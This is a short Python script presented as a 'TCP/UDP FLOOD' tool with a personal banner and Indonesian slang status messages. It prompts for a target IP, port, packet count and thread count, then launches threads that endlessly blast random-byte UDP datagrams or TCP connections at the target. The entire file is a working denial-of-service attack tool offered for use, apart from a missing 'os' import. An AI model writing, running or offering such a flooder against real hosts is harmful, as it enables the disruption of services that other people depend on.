import random
import socket
import threading

os.system("clear")
print("--> XRyhs Ganteng <--")
print("#-- TCP/UDP FLOOD --#")
ip = str(input(" Host/Ip:"))
port = int(input(" Port:"))
choice = str(input(" UDP(y/n):"))
times = int(input(" Packet:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(3541)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" XRyhs Nih Boss")
		except:
			print("[!] Yah Down Aowkkww")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" XRyhs Nih bis")
		except:
			s.close()
			print("[*] Yah Dow Aowkkww")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()